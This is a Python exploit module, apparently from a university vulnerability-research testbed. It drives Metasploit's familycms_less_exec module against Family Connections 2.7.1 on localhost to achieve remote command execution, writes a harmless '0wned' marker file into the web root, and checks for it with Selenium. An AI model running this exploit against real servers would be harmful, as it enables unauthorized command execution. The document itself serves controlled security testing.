
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import os
import time

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "EDB_18198",
                  'Description' : "Family Connections less.php Remote Command Execution"
                                  "Authentication isn't required to exploit"
				  "the vulnerability but register_globals must be set to On."
                                  "Requires PHP < 5.4 due to the register_gobals dependancy.",
                  'References' :  [['EDB', '18198']],
                  'Target' :      "Family Connections 2.7.1",
                  'TargetLicense' : '',
                  'VulWikiPage' : "",
                  'Type' : 'EXEC'
                  }
                                

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):

        metasploit_cmd = "framework/Exploits/metasploit-framework/msfcli multi/http/familycms_less_exec " \
                         "RHOST=127.0.0.1 URI=/family/ PAYLOAD=cmd/unix/generic cmd='echo \"0wned\" > /var/www/family/owned.txt' E"
        self.logger.info("Running Metasploit")
        os.system(metasploit_cmd)

        self.logger.info("Done! http://localhost/family/owned.txt should now exist.")
        return

    def verify(self):
        driver = self.create_selenium_driver()
        driver.get("http://127.0.0.1/family/owned.txt")
        verified = driver.page_source.find("0wned") != -1
        driver.cleanup()
        return verified
